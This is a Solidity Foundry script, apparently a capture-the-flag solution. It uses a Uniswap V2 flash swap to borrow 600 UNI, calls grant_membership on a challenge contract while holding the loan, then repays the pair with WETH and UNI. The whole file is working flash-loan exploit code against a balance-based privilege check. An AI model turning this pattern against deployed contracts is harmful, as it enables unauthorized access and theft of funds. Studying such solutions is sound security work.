// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";
import "src/utils/UniswapV2Library.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IChallenge {
    function grant_membership(string memory _pub_key) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract ExploitScript is Script {
    address constant wethAddress = 0xc778417E063141139Fce010982780140Aa0cD5Ab;

    function run() public {
        Exploit exploit = new Exploit();
        exploit.exploit{value: 2 ether}();
    }
}

contract Exploit {
    address constant uniAddress = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address constant wethAddress = 0xc778417E063141139Fce010982780140Aa0cD5Ab;
    address constant factoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address constant target = 0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61;
    address uniWethPair;

    function exploit() public payable {
        uniWethPair = UniswapV2Library.pairFor(factoryAddress, uniAddress, wethAddress);
        IUniswapV2Pair(uniWethPair).swap(6e20, 0, address(this), "0");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        IChallenge(target).grant_membership(
            "1337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337"
        );
        IWETH(wethAddress).deposit{value: address(this).balance}();
        IWETH(wethAddress).transfer(msg.sender, IWETH(wethAddress).balanceOf(address(this)));
        IERC20(uniAddress).transfer(msg.sender, IERC20(uniAddress).balanceOf(address(this)));
    }
}
